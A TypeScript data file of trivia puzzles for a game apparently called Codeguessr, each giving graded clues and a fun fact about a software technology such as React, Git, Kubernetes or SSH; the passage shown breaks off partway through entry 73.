import type { PuzzleText } from '../../shared/types';

/** Clues run from hardest/vaguest to easiest/most specific. Keyed by puzzle id (data/shared/puzzles.ts). */
export const puzzles: Record<number, PuzzleText> = {
  1: {
    clues: [
      "Born inside a social network's ads team in 2011, and open-sourced two years later.",
      'Its creators argued that markup and logic belong in the same file, which upset a lot of people at first.',
      'It popularised the idea of a virtual DOM that gets diffed before the real one is touched.',
      'Hooks such as useState and useEffect replaced most of its class components.',
      'You usually write its components in JSX.',
      "Meta's JavaScript library for building user interfaces, with a Native sibling for mobile apps."
    ],
    funFact: "React ran in production on Facebook's News Feed in 2011 and on Instagram in 2012, before it was open-sourced at JSConf US in 2013."
  },
  2: {
    clues: [
      'It started as an internal project at a platform-as-a-service company called dotCloud.',
      'It made Linux namespaces and cgroups usable by people who had never heard of them.',
      'Its images are built in layers, and every instruction adds one.',
      '"It works on my machine" became "then we\'ll ship your machine".',
      'You describe an image in a file full of FROM, RUN and COPY instructions.',
      'Containers, a whale for a logo, and a Hub full of images.'
    ],
    funFact: 'Docker was first shown to the world in a five-minute lightning talk by Solomon Hykes at PyCon 2013.'
  },
  3: {
    clues: [
      'Its author joked that he names all his projects after himself; this name is British slang for an unpleasant person.',
      'It was written in about ten days, after a licence dispute over the tool the Linux kernel used before.',
      'Every copy of a repository holds the full history, so no single server is special.',
      'It stores content as objects addressed by their hash: blobs, trees and commits.',
      'rebase, cherry-pick and bisect are some of its subcommands.',
      'The version control system behind GitHub and GitLab.'
    ],
    funFact: 'Linus Torvalds started Git in April 2005, and within days it was managing its own source code.'
  },
  4: {
    clues: [
      'It began in 2006 as the personal side project of a Mozilla employee.',
      "It has topped Stack Overflow's list of most admired languages year after year.",
      'Its compiler tracks who owns every value and how long every reference lives.',
      'It promises memory safety without a garbage collector.',
      'Its packages are called crates and are managed with Cargo.',
      'Its fans call themselves Rustaceans, and its unofficial mascot is Ferris the crab.'
    ],
    funFact: "It is named after the rust fungi, which its creator Graydon Hoare called 'over-engineered for survival'."
  },
  5: {
    clues: [
      'It was built internally in 2012 while a huge mobile app struggled to load its feed quickly.',
      'In 2018 it moved to its own foundation under the Linux Foundation.',
      'Clients ask for exactly the fields they need, no more and no less.',
      'Everything is described by a strongly typed schema, and writes go through mutations.',
      'It is usually served from a single endpoint, as an alternative to REST.',
      'A query language for APIs, created at Facebook, with a pink logo and Apollo clients.'
    ],
    funFact: "The 'QL' stands for query language, but it isn't tied to any database: resolvers can fetch data from anywhere."
  },
  6: {
    clues: [
      'Its name comes from the Greek word for helmsman.',
      'It descends from an internal Google system called Borg.',
      'Its smallest deployable unit is called a pod.',
      'You declare the desired state in YAML and controllers keep reconciling towards it.',
      'Its command-line tool is kubectl, however you choose to pronounce it.',
      'Container orchestration, often shortened to k8s.'
    ],
    funFact: "The seven spokes in its logo refer to 'Project Seven of Nine', the Star Trek-inspired internal codename."
  },
  7: {
    clues: [
      'Its lead architect previously designed Turbo Pascal, Delphi and C#.',
      'Microsoft released it publicly in October 2012.',
      'Its type system is structural, and famously Turing complete.',
      'Almost everything you write in it disappears at compile time.',
      'Its files end in .ts, and you can add it to an existing codebase gradually.',
      'JavaScript with static types.'
    ],
    funFact: 'Its compiler is being ported to Go for a roughly tenfold speed-up; the native compiler ships as version 7.'
  },
  8: {
    clues: [
      'It grew out of a Berkeley research project led by Michael Stonebraker in the 1980s.',
      'Its original name said it came after Ingres.',
      'It gained SQL support in the mid-1990s and changed its name to show it.',
      'It is known for MVCC, extensions such as PostGIS, and JSONB columns.',
      'Its command-line client is psql, and its mascot is an elephant called Slonik.',
      'The open-source relational database usually shortened to Postgres.'
    ],
    funFact: "Its elephant mascot, Slonik, is named after the Russian word for 'little elephant'."
  },
  9: {
    clues: [
      'It was announced in 2015 as a joint effort by the teams behind all four major browser engines.',
      'It became a W3C Recommendation in 2019.',
      'It is a stack-based virtual machine with a compact binary format.',
      'Its text format uses S-expressions, in files ending in .wat.',
      'You compile Rust, C or C++ to it and run the result in a browser at near-native speed.',
      'Often shortened to Wasm, the fourth language of the web.'
    ],
    funFact: 'It grew out of asm.js, a strict subset of JavaScript that browsers could optimise ahead of time.'
  },
  10: {
    clues: [
      'Its creator started it as a hobby project over the Christmas holidays of 1989.',
      "That creator held the title 'Benevolent Dictator For Life' until 2018.",
      'Its style guide is known by a number: PEP 8.',
      'Indentation is not optional: it defines the blocks.',
      'import this prints its Zen, and pip installs its packages.',
      'Named after a British comedy group, not a snake.'
    ],
    funFact: "Guido van Rossum named it after Monty Python's Flying Circus; the snake logo came later."
  },
  11: {
    clues: [
      'Its second major version was a complete rewrite that shared little more than a name with the first.',
      'Google maintains it, and it has used TypeScript since that rewrite.',
      'It leans on dependency injection, decorators and, more recently, signals.',
      'Its CLI generates components, services and whole workspaces.',
      'Standalone components replaced NgModules as its default.',
      "Google's framework with a red shield logo, successor to AngularJS."
    ],
    funFact: 'Codeguessr itself is built with it, prerendered to static HTML for GitHub Pages.'
  },
  12: {
    clues: [
      "Tim Berners-Lee's first version of it had exactly one method.",
      'Version 1.1 was standardised in 1997 and kept connections open by default.',
      'Every response starts with a three-digit status code.',
      'Everyone knows 404; fewer know 418, "I\'m a teapot".',
      'Its third version runs over QUIC instead of TCP.',
      'The protocol behind every web page; add an S and it is encrypted.'
    ],
    funFact: 'Version 0.9 had a single method, GET, and no headers or status codes at all.'
  },
  13: {
    clues: [
      'An Italian developer wrote it in 2009 to speed up a real-time web analytics startup.',
      'It keeps everything in memory and does most of its work on a single thread.',
      'Besides strings it offers lists, sets, sorted sets, hashes and streams.',
      'People use it as a cache, a message broker and a rate limiter.',
      'SET, GET, EXPIRE and INCR are some of its commands.',
      'An in-memory key-value store whose name stands for REmote DIctionary Server.'
    ],
    funFact: 'Its 2024 licence change led to Valkey, a fork backed by the Linux Foundation.'
  },
  14: {
    clues: [
      'Its author announced it in 1991 as "just a hobby, won\'t be big and professional like GNU".',
      'An FTP server admin picked its name; the author wanted to call it Freax.',
      'Strictly it is only a kernel, though people usually mean a whole operating system.',
      "It runs every one of the world's 500 fastest supercomputers and every Android phone.",
      'Its distributions include Debian, Fedora, Arch and Ubuntu.',
      "Linus Torvalds' kernel, with a penguin mascot called Tux."
    ],
    funFact: 'Every system on the TOP500 supercomputer list has run it since November 2017.'
  },
  15: {
    clues: [
      'A former Google engineer who had worked with AngularJS started it in 2013.',
      "It calls itself 'the progressive framework'.",
      'Its single-file components hold template, script and style together.',
      'Version 3 added the Composition API next to the Options API.',
      'Its ecosystem includes Pinia for state and Nuxt for full-stack apps.',
      "Evan You's framework, with a green V-shaped logo."
    ],
    funFact: "Its name is French for 'view', the V in MVC."
  },
  16: {
    clues: [
      'Three engineers designed it at Google in 2007 while waiting for a large C++ build to finish.',
      'Two of them, Ken Thompson and Rob Pike, had also worked on Unix and UTF-8.',
      'It has no classes, and for its first twelve years it had no generics either.',
      'It compiles to a single static binary, and its formatter ends every style debate.',
      'Concurrency comes from goroutines and channels.',
      'The language with a gopher mascot, also called Golang.'
    ],
    funFact: 'The gopher mascot was drawn by Renée French, who also drew Glenda, the Plan 9 bunny.'
  },
  17: {
    clues: [
      'It was standardised as RFC 6455 in 2011.',
      'A connection starts as an ordinary HTTP request with an Upgrade header.',
      'After the handshake, both sides can send messages whenever they like.',
      'It is the usual choice for chat apps, live dashboards and browser multiplayer games.',
      'Its URLs start with ws:// or wss://.',
      'A full-duplex connection between browser and server over a single TCP socket.'
    ],
    funFact: "The server proves it understood the handshake by hashing the client's key with a fixed GUID, 258EAFA5-E914-47DA-95CA-C5AB0DC85B11."
  },
  18: {
    clues: [
      'Ryan Dahl presented it at JSConf EU in 2009.',
      "It took Google's V8 engine out of the browser.",
      'Its event loop is built on libuv and handles I/O without blocking.',
      'A package manager launched a year later made it huge.',
      'It lets you write servers in JavaScript, first with require() and later with ES modules.',
      'The server-side JavaScript runtime with a green hexagon logo.'
    ],
    funFact: 'Its creator later built Deno, partly to fix what he called his regrets about it.'
  },
  19: {
    clues: [
      'Douglas Crockford says he discovered it rather than invented it.',
      'It has no comments, on purpose, so nobody could use them for parsing directives.',
      'It knows only objects, arrays, strings, numbers, booleans and null.',
      'A trailing comma is a syntax error in it.',
      'In the browser you convert to and from it with stringify and parse.',
      'JavaScript Object Notation.'
    ],
    funFact: 'Its ECMA standard is numbered ECMA-404, which developers find suspiciously fitting.'
  },
  20: {
    clues: [
      'A graphics editor at The Guardian created it in 2016.',
      'It calls itself a compiler rather than a framework you ship to the browser.',
      'It has no virtual DOM: components compile to code that updates the page directly.',
      'Version 5 introduced runes such as $state and $derived.',
      "Components live in files with its own extension, and the app framework on top ends in 'Kit'.",
      "Rich Harris' 'disappearing framework', with an orange S logo."
    ],
    funFact: 'Vercel hired Rich Harris in 2021 to work on it full-time.'
  },
  21: {
    clues: [
      'It was written in 2000 for software on a US Navy guided-missile destroyer.',
      'Its source code is in the public domain, and it offers a blessing instead of a licence.',
      'A whole database lives in one ordinary file.',
      'It is probably the most widely deployed database engine: every phone and browser ships it.',
      'There is no server process; it runs inside your application as a library.',
      'The tiny embedded SQL database with a feather in its logo.'
    ],
    funFact: 'Its developers plan to support it until 2050, and the US Library of Congress recommends its file format for long-term storage.'
  },
  22: {
    clues: [
      'Bram Moolenaar first released it for the Amiga in 1991.',
      'It was charityware: users were asked to donate to children in Uganda.',
      'It is modal: normal mode for commands, insert mode for typing.',
      'The keys h, j, k and l move the cursor.',
      'How to quit it is one of the most famous questions on Stack Overflow.',
      'Vi IMproved, whose modern fork is called Neovim.'
    ],
    funFact: 'The Stack Overflow question on how to exit it has been viewed millions of times.'
  },
  23: {
    clues: [
      'JetBrains announced it in 2011, naming it after a place, just like the language it hoped to replace.',
      'It runs on the JVM and works seamlessly with Java code.',
      'Its type system tells nullable and non-null types apart.',
      'Coroutines are its answer to asynchronous code.',
      'In 2019 Google made it the preferred language for Android.',
      "JetBrains' language, in files ending in .kt."
    ],
    funFact: 'Java is named after an island, and so is it: Kotlin Island, in the Gulf of Finland.'
  },
  24: {
    clues: [
      'HashiCorp released it in 2014.',
      'A licence change in 2023 led to a fork called OpenTofu.',
      'You describe infrastructure in HCL and it works out a plan.',
      'It keeps track of what it created in a state file.',
      'plan, apply and destroy are its core commands.',
      "HashiCorp's infrastructure-as-code tool, with .tf files."
    ],
    funFact: 'IBM agreed in 2024 to buy HashiCorp for about 6.4 billion dollars.'
  },
  25: {
    clues: [
      'It started in 2006, when Twitter developers wanted apps to use accounts without asking for passwords.',
      'Version 2.0 was published as RFC 6749 in 2012.',
      'It is about authorisation, not authentication; OpenID Connect adds the identity layer.',
      'Its flows include authorization code, client credentials and device code.',
      "PKCE protects its authorization code flow for apps that can't keep a secret.",
      "The protocol behind 'Sign in with Google' that hands out access tokens."
    ],
    funFact: "Codeguessr's own Google sign-in uses its authorization code flow with PKCE, through Supabase."
  },
  26: {
    clues: [
      'Håkon Wium Lie proposed it in 1994 while working at CERN.',
      'Its first level became a W3C Recommendation in 1996.',
      'Specificity and the cascade decide which rule wins.',
      'Flexbox and Grid finally made layout sane.',
      'Recent additions include :has(), nesting and container queries.',
      'Cascading Style Sheets.'
    ],
    funFact: "For years, 'how do I centre a div' was the running joke; today the answer is 'display: grid; place-items: center'."
  },
  27: {
    clues: [
      'Adam Wathan released it in 2017, after a blog post that questioned semantic class names.',
      'Instead of components, it gives you small single-purpose classes.',
      'Critics say it brings inline styles back into the HTML; fans never want to name a class again.',
      'Its build step scans your files and only generates the classes you use.',
      'Its classes look like flex, pt-4, text-center and md:grid-cols-2.',
      'The utility-first CSS framework.'
    ],
    funFact: 'Version 4 moved its configuration out of a JavaScript file and into CSS itself.'
  },
  28: {
    clues: [
      'Igor Sysoev started it in 2002 to solve the C10k problem.',
      'It was first built for Rambler, a Russian web portal.',
      'It uses an event-driven architecture instead of a thread per connection.',
      'It is a web server, reverse proxy, load balancer and cache in one.',
      "Its name is pronounced 'engine-x'.",
      'The web server that overtook Apache as the most used on the web.'
    ],
    funFact: 'F5 Networks bought the company behind it in 2019 for 670 million dollars.'
  },
  29: {
    clues: [
      'The company 10gen built it in 2007, originally as part of a platform-as-a-service.',
      "Its name comes from the word 'humongous'.",
      'It stores documents as BSON, a binary form of JSON.',
      'You query it with find() and aggregation pipelines instead of SQL.',
      'Its managed cloud service is called Atlas.',
      'The best-known document database, with a green leaf logo.'
    ],
    funFact: "A 2010 animated video mocking it as 'web scale' became one of the best-known programming memes."
  },
  30: {
    clues: [
      'Chris Lattner started it in 2010, after creating LLVM.',
      'Apple introduced it at WWDC 2014.',
      'Optionals force you to deal with missing values.',
      'It replaced Objective-C as the default language for Apple platforms.',
      'Its Playgrounds run your code line by line as you type.',
      "Apple's language for iOS and macOS apps, with a bird logo."
    ],
    funFact: 'It was open-sourced in December 2015 and also runs on Linux and Windows.'
  },
  31: {
    clues: [
      'Tobias Koppers started it in 2012 as a side project.',
      'Instagram was one of its first big adopters.',
      'It builds a dependency graph from an entry point and emits bundles.',
      'Loaders transform files, and plugins hook into the whole compilation.',
      'Its config file is famously long, and hot module replacement came from its dev server.',
      'The JavaScript module bundler with a blue cube logo, now challenged by Vite.'
    ],
    funFact: "Its creator built it after his pull request adding code splitting to another bundler wasn't accepted."
  },
  32: {
    clues: [
      'Paul Mockapetris designed it in 1983 to replace a single shared hosts file.',
      'Thirteen named root server identities sit at the top of it.',
      'It mostly runs over UDP port 53.',
      'A, AAAA, CNAME and MX are some of its record types.',
      "A famous sysadmin haiku ends with: 'It was ___.'",
      "The internet's phone book, turning names into IP addresses."
    ],
    funFact: 'Codeguessr lives on one of its CNAME records: codeguessr points to a github.io host.'
  },
  33: {
    clues: [
      "James Gosling's team started it at Sun in 1991, under the name Oak.",
      "Its slogan was 'write once, run anywhere'.",
      'It compiles to bytecode for a virtual machine.',
      'Oracle has owned it since buying Sun in 2010.',
      'Minecraft was first written in it, and so were countless enterprise backends.',
      'The language with a coffee cup logo and public static void main.'
    ],
    funFact: "It was renamed because 'Oak' was already a trademark; the new name came from coffee."
  },
  34: {
    clues: [
      'José Valim created it in 2011 after years of working on Ruby on Rails.',
      'It compiles to bytecode for the BEAM, the Erlang virtual machine.',
      'Lightweight processes and supervisors let systems heal themselves.',
      'The pipe operator |> chains function calls.',
      'Phoenix is its best-known web framework, famous for LiveView.',
      'The functional language with a purple drop logo and .ex files.'
    ],
    funFact: 'Since version 1.17 in 2024 it has been adding a gradual, set-theoretic type system.'
  },
  35: {
    clues: [
      'It began at Sun in 2004 under another name: Hudson.',
      'It got its current name in 2011 after a dispute with Oracle.',
      'Its pipelines are written in a Groovy-based DSL.',
      'More than a thousand plugins extend it.',
      'Its mascot is a butler.',
      'The self-hosted automation server that ran CI long before GitHub Actions.'
    ],
    funFact: 'Its creator, Kohsuke Kawaguchi, wrote it because he kept breaking the build.'
  },
  36: {
    clues: [
      'A company then called Zeit released it in 2016.',
      'It began as a way to render React on the server with almost no configuration.',
      'Its pages were files in a pages folder, and later in an app folder.',
      'It introduced most developers to React Server Components.',
      'getServerSideProps and incremental static regeneration are its terms.',
      'The React framework from Vercel.'
    ],
    funFact: 'The company behind it was called Zeit until it renamed itself Vercel in 2020.'
  },
  37: {
    clues: [
      'Brian Fox wrote it in 1989 for the GNU Project.',
      'Its name is a pun on the shell it replaced, written by Stephen Bourne.',
      'Shellshock, a 2014 bug in how it handled environment variables, hit millions of servers.',
      'It is the default shell on most Linux distributions; macOS switched to zsh in 2019.',
      'Scripts start with #!/bin/… and variables look like $HOME.',
      'The Bourne Again SHell.'
    ],
    funFact: 'macOS shipped a 2007 version of it for years, because newer versions use the GPLv3 licence.'
  },
  38: {
    clues: [
      'LinkedIn built it around 2010 to move huge amounts of activity data.',
      "Its creator named it after a writer, since it is 'a system optimised for writing'.",
      'It stores messages in an append-only, partitioned, replicated log.',
      'Consumers keep track of their own offsets and can replay history.',
      'Its creators founded Confluent to sell it as a service.',
      "Apache's distributed event streaming platform, named after Franz."
    ],
    funFact: 'Jay Kreps named it after the author Franz Kafka, simply because he liked his work.'
  },
  39: {
    clues: [
      "It grew out of Stubby, Google's internal RPC system.",
      'Google open-sourced it in 2015; it is now a CNCF project.',
      'It runs over HTTP/2 and supports streaming in both directions.',
      'Services and messages are defined in .proto files.',
      'Protocol Buffers are its default serialisation format.',
      "Google's high-performance RPC framework, whose 'g' means something different in every release."
    ],
    funFact: "Every release gives the 'g' a new meaning, from 'good' and 'green' to 'gravity' and 'goose'."
  },
  40: {
    clues: [
      'Rasmus Lerdorf wrote it in 1994 to track visits to his online CV.',
      'Its creator has said he never meant to create a programming language.',
      'All of its variables start with a dollar sign.',
      'WordPress is written in it, and with it a large share of the web.',
      'Its name once stood for Personal Home Page; now it is a recursive acronym.',
      'Hypertext Preprocessor, with an elephant mascot called the elePHPant.'
    ],
    funFact: 'Version 6 was never released: its Unicode rewrite was abandoned, and the next release became 7.'
  },
  41: {
    clues: [
      'It was built at a newspaper in Lawrence, Kansas, and released in 2005.',
      "It's named after a jazz guitarist.",
      'It comes with an automatic admin interface.',
      "Its ORM, migrations and templates are built in: 'batteries included'.",
      "Its slogan: 'The web framework for perfectionists with deadlines.'",
      "Python's best-known web framework, named after Django Reinhardt."
    ],
    funFact: 'Instagram runs one of the largest deployments of it in the world.'
  },
  42: {
    clues: [
      'A committee created it in 1990 to unify the many lazy functional languages of the time.',
      'It is purely functional: functions have no side effects.',
      'It evaluates lazily, so infinite lists are no problem.',
      'Side effects are handled with monads, the subject of countless tutorials.',
      'GHC is its main compiler, and Cabal and Stack build its projects.',
      'The pure functional language named after the logician Haskell Curry.'
    ],
    funFact: 'Pandoc, the universal document converter, is written in it.'
  },
  43: {
    clues: [
      'Microsoft announced it at its Build conference in 2015.',
      'It is built on Electron, and its editor core became the Monaco editor.',
      'It introduced the Language Server Protocol.',
      'Its marketplace holds tens of thousands of extensions.',
      'Stack Overflow surveys name it the most popular developer environment year after year.',
      "Microsoft's free code editor, not to be confused with Visual Studio."
    ],
    funFact: 'Its source is MIT-licensed, but the build Microsoft ships adds telemetry and branding; VSCodium strips both.'
  },
  44: {
    clues: [
      'Its creator introduced it in a 2018 talk about ten things he regretted.',
      'Its name is an anagram of its predecessor.',
      'It is written in Rust and runs TypeScript without a build step.',
      'Scripts get no file, network or environment access unless you grant it with flags.',
      'Version 2 added full npm and package.json compatibility.',
      "Ryan Dahl's second JavaScript runtime, with a dinosaur mascot."
    ],
    funFact: "In 2024 the company behind it asked the US trademark office to cancel Oracle's 'JavaScript' trademark."
  },
  45: {
    clues: [
      'A Finnish researcher wrote it in 1995 after a password-sniffing attack on his university network.',
      'Its default port, 22, sits between the two older protocols it replaced.',
      'It made telnet and rlogin obsolete.',
      'Public-key authentication lets you log in without typing a password.',
      'It can forward ports, tunnel traffic and copy files with scp.',
      'Secure Shell.'
    ],
    funFact: 'Tatu Ylönen got port 22 by emailing IANA and asking for it; the number was his the next day.'
  },
  46: {
    clues: [
      'David Heinemeier Hansson extracted it from Basecamp in 2004.',
      'Its philosophy: convention over configuration, and don’t repeat yourself.',
      'A famous 2005 video showed how to build a blog with it in 15 minutes.',
      'ActiveRecord maps your database tables to classes.',
      'GitHub, Shopify and Basecamp run on it.',
      'The Ruby web framework usually just called Rails.'
    ],
    funFact: 'Its creator also races cars, and won his class at the 24 Hours of Le Mans in 2014.'
  },
  47: {
    clues: [
      'Anders Hejlsberg led its design at Microsoft around 2000.',
      "Its working name was Cool: 'C-like Object Oriented Language'.",
      'LINQ brought query syntax into the language itself.',
      'async/await went mainstream here before JavaScript adopted it.',
      'It runs on .NET and powers Unity games.',
      "Microsoft's language whose name is a musical note."
    ],
    funFact: "The sharp in its name is a semitone above the note; Microsoft also likes to see it as four '+' signs stacked together."
  },
  48: {
    clues: [
      'Its creator wrote an earlier search library to help his wife search her recipes.',
      'It is built on the Apache Lucene library.',
      'It stores JSON documents in inverted indexes spread across shards.',
      'It is the E in the ELK stack, together with Logstash and Kibana.',
      'Its 2021 licence change led AWS to fork it as OpenSearch.',
      'The distributed search and analytics engine from Elastic.'
    ],
    funFact: 'In 2024 it became open source again by adding the AGPL as a licence option.'
  },
  49: {
    clues: [
      'Evan You created it in 2020 while working on the next version of his framework.',
      "Its name is the French word for 'quick'.",
      'In development it serves native ES modules and skips bundling.',
      'It uses esbuild for dependencies and Rollup, now Rolldown, for production builds.',
      'It is the default for SvelteKit, Nuxt, Astro and most new React projects.',
      'The fast frontend build tool with a purple lightning bolt logo.'
    ],
    funFact: 'Vitest, its test-runner companion, reuses the same config and plugins.'
  },
  50: {
    clues: [
      'It succeeded a protocol that Netscape designed in the mid-1990s.',
      'Version 1.3, from 2018, cut the handshake down to a single round trip.',
      'It relies on certificates signed by certificate authorities to prove identity.',
      'Heartbleed was a 2014 bug in the most popular library implementing it.',
      "Let's Encrypt made its certificates free.",
      'Transport Layer Security, the S in HTTPS.'
    ],
    funFact: "People still say 'SSL', even though every SSL version has been deprecated for years."
  },
  51: {
    clues: [
      'It was created in 1993 at a university in Rio de Janeiro.',
      "Its name is the Portuguese word for 'moon'.",
      'Tables are its only data structure, used for arrays, maps and objects alike.',
      'Arrays start at index 1.',
      'Roblox, World of Warcraft add-ons and Neovim configurations use it.',
      'The small embeddable scripting language from Brazil.'
    ],
    funFact: 'Roblox built its own typed dialect of it, called Luau.'
  },
  52: {
    clues: [
      'Facebook released it in 2014.',
      'Its original selling point was that it mocked every module automatically.',
      'Snapshot testing made it famous.',
      'describe, it and expect are its core functions.',
      'It was the default test runner in create-react-app.',
      'The JavaScript testing framework whose name is a joke.'
    ],
    funFact: 'Meta handed it over to the OpenJS Foundation in 2022.'
  },
  53: {
    clues: [
      'Michael DeHaan released it in 2012.',
      'Its name comes from a faster-than-light communication device in science fiction.',
      'It is agentless: it connects to machines over SSH.',
      'Playbooks written in YAML describe the desired state.',
      'Red Hat bought the company behind it in 2015.',
      "Red Hat's agentless automation tool."
    ],
    funFact: "The word was coined by Ursula K. Le Guin in her 1966 novel Rocannon's World."
  },
  54: {
    clues: [
      "Bjarne Stroustrup started it at Bell Labs in 1979 as 'C with Classes'.",
      'Its name is a joke on the increment operator.',
      'Its templates turned out to be Turing complete, by accident.',
      'RAII ties the lifetime of a resource to the lifetime of an object.',
      'Unreal Engine, Chrome and most game engines are written in it.',
      "Stroustrup's extension of C, with a new ISO standard every three years."
    ],
    funFact: 'Its standard is revised every three years; the 2023 edition is its seventh.'
  },
  55: {
    clues: [
      'Roy Fielding defined it in his PhD dissertation in 2000.',
      'He had also co-authored the HTTP/1.1 specification.',
      'It is an architectural style, not a protocol or a standard.',
      'Statelessness and a uniform interface are among its constraints.',
      'Resources have URLs and are changed with GET, POST, PUT and DELETE.',
      'Representational State Transfer.'
    ],
    funFact: 'Fielding has complained that most APIs calling themselves by its name ignore hypermedia, one of its core constraints.'
  },
  56: {
    clues: [
      'It started in 1976 as a set of macros for the TECO editor.',
      'Richard Stallman wrote its GNU version in 1984.',
      'It is extended in, and largely written in, its own Lisp dialect.',
      "Its key bindings earned it the nickname 'Escape Meta Alt Control Shift'.",
      'Org mode, Magit and a built-in psychotherapist run inside it.',
      "Vim's eternal rival in the editor wars."
    ],
    funFact: 'M-x doctor starts an ELIZA-style therapist right inside it.'
  },
  57: {
    clues: [
      'Martin Odersky designed it at EPFL in Switzerland and released it in 2004.',
      "Its name is short for 'scalable language'.",
      'It mixes object-oriented and functional programming on the JVM.',
      'Twitter moved much of its backend from Ruby to it.',
      'Apache Spark and Akka are written in it.',
      'The JVM language whose version 3 was called Dotty during development.'
    ],
    funFact: "Its creator also wrote Java's generics and the javac compiler that shipped with them."
  },
  58: {
    clues: [
      'It was first released in 2007 by a joint venture of two British companies.',
      'It is written in Erlang.',
      'It was built to implement AMQP 0-9-1.',
      'Producers publish to exchanges, which route messages into queues.',
      'Its management interface usually lives on port 15672.',
      'The popular open-source message broker with an animal in its name.'
    ],
    funFact: 'SpringSource, part of VMware, bought it in 2010; via Pivotal and VMware it is now owned by Broadcom.'
  },
  59: {
    clues: [
      'John Resig announced it at BarCamp NYC in 2006.',
      "Its motto was 'write less, do more'.",
      'It smoothed over the differences between Internet Explorer and everything else.',
      'Its dollar-sign function selects elements with CSS selectors.',
      '$(document).ready() was the first line of countless scripts.',
      'The JavaScript library that once ran on most of the web.'
    ],
    funFact: 'Even in the 2020s it still runs on most of the top million websites.'
  },
  60: {
    clues: [
      'John Gruber created it in 2004, with help from Aaron Swartz.',
      'Its goal was plain text that reads well even before it is rendered.',
      'CommonMark set out to fix the ambiguities in its original description.',
      'A # makes a heading and asterisks add emphasis.',
      'README files on GitHub are usually written in it.',
      'The lightweight markup language, in files ending in .md.'
    ],
    funFact: "Codeguessr's README, like that of almost every repository, is written in it."
  },
  61: {
    clues: [
      'Its first prototype was written in about ten days in May 1995.',
      'It was called Mocha and then LiveScript before a marketing deal gave it its final name.',
      'Its official standard goes by another name and is maintained by a committee called TC39.',
      "typeof null returns 'object', a bug from its first version that can never be fixed.",
      'Brendan Eich created it at Netscape, and today every browser runs it.',
      'The language of the web, with no relation to Java beyond the name.'
    ],
    funFact: 'The trademark on its name belongs to Oracle, which inherited it from Sun Microsystems; that is one reason the standard is called ECMAScript.'
  },
  62: {
    clues: [
      'Akamai, founded by MIT researchers in 1998, pioneered it.',
      'It keeps copies of files on servers close to users around the world.',
      'Those servers are called edge servers or points of presence.',
      "In June 2021, one customer's settings change at Fastly broke many of the world's big websites.",
      'Cloudflare and Fastly are big providers.',
      'A Content Delivery Network.'
    ],
    funFact: 'The 2021 Fastly outage lasted under an hour but took down sites such as Amazon, Reddit and the BBC.'
  },
  63: {
    clues: [
      'Ken Thompson and Rob Pike designed it on a placemat in a New Jersey diner in 1992.',
      'It uses one to four bytes per character.',
      'Every plain ASCII file is already valid in it.',
      'Almost every web page today is encoded with it.',
      '<meta charset="..."> in HTML usually names it.',
      'The most common Unicode encoding, whose name ends in 8.'
    ],
    funFact: 'It was designed in one evening, and within days Thompson and Pike had converted their Plan 9 operating system to it.'
  },
  64: {
    clues: [
      'Andy Rubin and others founded the company in 2003, first aiming at digital cameras.',
      'Google bought the company in 2005.',
      'The first phone to run it was the HTC Dream, in 2008.',
      'For ten years its versions were named after sweet treats, in alphabetical order.',
      'It is the most used operating system in the world.',
      "Google's mobile OS, with a green robot for a mascot."
    ],
    funFact: 'Its dessert names ran from Cupcake to Pie, and version 10 in 2019 was the first to drop the tradition publicly.'
  },
  65: {
    clues: [
      'Tom Preston-Werner, a co-founder of GitHub, created it in 2013.',
      'It aims to map unambiguously to a hash table.',
      'Sections are written as headers in square brackets.',
      "Rust's Cargo reads its manifest in this format.",
      "Python's pyproject files use it too.",
      "The config format named 'Tom's Obvious, Minimal Language'."
    ],
    funFact: "Its creator named it after himself: Tom's Obvious, Minimal Language."
  },
  66: {
    clues: [
      "Ted Neward famously called it 'the Vietnam of computer science' in 2006.",
      "It tries to bridge the 'impedance mismatch' between objects and tables.",
      'The N+1 query problem is its best-known pitfall.',
      'Hibernate, Active Record and Prisma are examples.',
      'It lets you work with rows as if they were objects in your language.',
      'Object-relational mapping.'
    ],
    funFact: "Ted Neward's comparison argued it is easy to get into, but very hard to get out of with a clean win."
  },
  67: {
    clues: [
      "It started as an April Fools' joke by Armin Ronacher in 2010.",
      'It is built on Werkzeug and the Jinja template engine.',
      'It calls itself a microframework.',
      "Routes are declared with a decorator such as @app.route('/').",
      'It is maintained by the Pallets project, a lightweight alternative to Django.',
      'The Python web framework named after a bottle for liquids.'
    ],
    funFact: 'The joke was a fake framework called Denied, packed into a single file; people liked the idea so much that it became a real project.'
  },
  68: {
    clues: [
      'Joe Becker, Lee Collins and Mark Davis started working on it in the late 1980s.',
      'Its first volume was published in 1991.',
      'Every character gets a code point, written like U+0041.',
      'It contains well over 150,000 characters, from ancient scripts to emoji.',
      'A consortium decides which new emoji get added.',
      'The universal standard for encoding the characters of every writing system.'
    ],
    funFact: 'A proposal to add the Klingon alphabet from Star Trek was rejected in 2001.'
  },
  69: {
    clues: [
      'It was formed in 2019 by merging OpenTracing and OpenCensus.',
      'It is a vendor-neutral standard for traces, metrics and logs.',
      'Its data travels over a protocol called OTLP.',
      'A component called the Collector receives, processes and exports the data.',
      'It is one of the most active projects in the Cloud Native Computing Foundation.',
      'The open standard for observability, often shortened to OTel.'
    ],
    funFact: 'It is often named as the second most active CNCF project, right after Kubernetes.'
  },
  70: {
    clues: [
      "It was created in the mid-1990s because another image format's compression was patented.",
      'Its unofficial expansion is a recursive dig at that older format.',
      'It is lossless and supports a full alpha channel for transparency.',
      'Every file starts with the bytes \\x89 followed by its own name.',
      'It is the usual choice for screenshots and logos.',
      "The Portable Network Graphics image format, pronounced 'ping'."
    ],
    funFact: "Its unofficial recursive acronym is 'PNG's Not GIF'."
  },
  71: {
    clues: [
      'It was founded in San Francisco in 2011.',
      'Its configuration lives in a config.yml inside a hidden folder.',
      'Reusable packages of configuration are called orbs.',
      'In January 2023 it told every customer to rotate all their secrets after a breach.',
      'It is a hosted continuous integration service that runs your tests on every push.',
      'The CI service with a round shape in its name.'
    ],
    funFact: "Its 2023 security incident started with malware on a single engineer's laptop."
  },
  72: {
    clues: [
      "Michael 'Monty' Widenius started it in 2009.",
      'It was a fork, created out of worry after Oracle bought Sun.',
      'It aims to be a drop-in replacement for the database it forked.',
      'Many Linux distributions replaced the original with it.',
      'Its logo is a sea lion.',
      "The MySQL fork named after its creator's younger daughter."
    ],
    funFact: 'Monty named his databases after his children: My, Maria, and Max for MaxDB.'
  },
  73: {
    clues: [
      'Jason Miller released it in 2015.',
      'It weighs about 3 kB, a fraction of the library it mimics.',
      'A compatibility layer lets you swap it in for a much bigger library.',
      'It helped popularise signals for state management in its ecosystem.',
